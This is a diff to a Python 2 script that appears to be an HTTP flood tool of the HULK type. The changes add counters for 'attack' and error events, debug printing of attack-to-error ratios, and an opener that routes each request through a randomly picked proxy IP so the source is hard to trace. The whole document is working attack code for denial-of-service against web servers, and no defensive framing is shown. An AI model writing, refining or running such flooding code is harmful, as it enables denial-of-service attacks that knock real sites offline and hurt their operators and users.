@@ -10,6 +10,8 @@ socket.setdefaulttimeout(1)
 #global params
 url=''
 host=''
+attackCount=0
+errorCount=0
 headers_useragents=[]
 headers_referers=[]
 request_counter=0
@@ -90,11 +92,27 @@ def httpcall(url):
         req = urllib2.Request(url=url,data=postdata,headers=headers)
         index = random.randint(0,len(ips)-1)
         proxy = urllib2.ProxyHandler({'http':ips[index]})
-        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
+        print ips[index]
+        #opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
+        #opener = urllib2.build_opener(urllib2.HTTPHandler)
+        opener = urllib2.build_opener(proxy)
         urllib2.install_opener(opener)
+        global attackCount
+        global errorCount
+        #if attackCount>=previous+100:
+            #print attackCount
+        print 'attack'
+        attackCount+=1
+        print attackCount
+            #previous=attackCount
+        #attackCount+=1
         try:
             urllib2.urlopen(req)
         except Exception,e:
+            print e
+            print 'error'
+            errorCount+=1
+            print attackCount*1.0/errorCount
             continue
 
 #http caller thread
